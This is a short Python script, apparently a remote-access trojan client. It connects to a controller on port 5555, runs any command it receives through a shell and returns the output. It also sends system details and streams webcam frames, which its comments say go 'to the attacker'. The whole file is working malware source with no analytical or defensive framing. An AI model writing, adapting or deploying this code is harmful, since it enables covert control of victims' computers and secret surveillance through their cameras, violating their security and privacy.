import sys
import socket
import subprocess
import cv2
import pickle
import struct

HOST = 'localhost'
PORT = 5555

s = socket.socket()
s.connect((HOST, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

# Initialize the camera
camera = cv2.VideoCapture(0)

while True:
    cmd = s.recv(1024).decode()
    print(f'[*] received: {cmd}')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    if cmd.lower() == 'sys':
        # Send the system details to the attacker
        system_info = sys.platform.encode()
        s.send(system_info)
        continue

    if cmd.lower() == 'camera':
        # Transmit the camera frames to the attacker
        while True:
            _, frame = camera.read()
            frame_data = pickle.dumps(frame)
            frame_size = struct.pack('!I', len(frame_data))
            s.sendall(frame_size + frame_data)
            if cv2.waitKey(1) == ord('q'):
                break
        continue

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        result = str(e.output).encode()
    except Exception as e:
        result = str(e).encode()

    s.send(result)

s.close()
camera.release()
cv2.destroyAllWindows()
